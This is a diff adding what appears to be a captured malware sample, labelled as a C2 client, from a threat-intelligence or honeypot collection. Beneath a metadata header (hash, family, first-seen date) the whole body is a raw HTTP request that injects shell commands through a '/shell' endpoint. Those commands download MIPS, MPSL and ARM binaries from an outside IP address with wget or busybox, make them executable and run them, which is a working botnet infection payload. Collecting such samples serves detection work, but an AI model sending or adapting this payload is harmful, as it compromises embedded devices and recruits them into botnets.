@@ -1,0 +1,18 @@
+# sha256: 1c817b9a560c34e64920257e30088ab462251138cc93e6cbf6b8be9fa01343a5
+# family: c2_client
+# kind: script
+# size_bytes: 727
+# first_seen: 2026-09-07 11:41:35.305878 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+GET /shell?cd+/tmp;rm+mpsl+mips+arm7;wget+-q+http:\/\/94.154.43.192\/bins\/mpsl+||busybox+wget+-q+http:\/\/94.154.43.192\/bins\/mpsl;chmod+777+mpsl;./mpsl+redkill;wget+-q+http:\/\/94.154.43.192\/bins\/mips+||busybox+wget+-q+http:\/\/94.154.43.192\/bins\/mips;chmod+777+mips;./mips+redkill;wget+-q+http:\/\/94.154.43.192\/bins\/arm7+||busybox+wget+-q+http:\/\/94.154.43.192\/bins\/arm7;chmod+777+arm7;./arm7+redkill HTTP/1.1
+Host: 190.179.137.193:6001
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
